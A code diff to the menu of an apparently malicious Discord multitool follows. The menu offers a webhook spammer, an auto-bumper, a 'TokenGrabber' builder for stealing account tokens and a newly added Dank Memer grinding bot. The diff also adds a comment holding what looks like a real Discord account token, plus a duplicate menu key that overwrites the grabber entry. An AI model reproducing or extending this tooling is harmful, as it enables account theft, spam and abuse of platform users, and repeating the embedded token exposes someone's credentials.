@@ -1,3 +1,4 @@
+# ODEyNjc0NTkyMDE0MzM2MDYw.YD1Bzg.F4_8KLvkhKGkybGSkaaKs_rDZqU
 from colored import fg, bg, attr
 import time
 import os
@@ -9,6 +10,7 @@ import modules.webhookSpammer as spammer
 import modules.autoBump as bumper
 import modules.tokenGrabber as grabber
 import modules.credits as credits
+import modules.dankMemer as memer
 
 r = fg(241) # Setup color variables
 r2 = fg(255)
@@ -27,6 +29,7 @@ class Client:
             "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
             "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
             "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
+            "7" : {"function" : memer.start, "name" : "Dank memer gridner"},
             "8" : {"function" : credits.show_credits, "name" : "Credits"},
             "9" : {"function" : exit, "name" : "Exit"}
         }
